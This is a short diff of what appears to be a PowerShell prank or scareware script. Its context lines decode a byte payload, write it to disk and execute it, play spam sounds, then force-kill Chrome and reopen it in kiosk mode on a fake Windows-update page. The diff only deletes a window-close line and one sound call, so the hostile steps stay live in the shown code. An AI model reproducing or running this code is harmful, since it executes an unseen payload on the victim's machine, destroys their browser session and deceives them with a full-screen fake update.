@@ -23,8 +23,6 @@ Set-Content -Path $File2 -Value $decodedFile -Encoding Byte
 & $File2
 
 SoundSpam
-$MainWindow.Close()
-SoundSpam
 Sleep 2
 cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk https://fakeupdate.net/win8 & exit")
 sleep 2
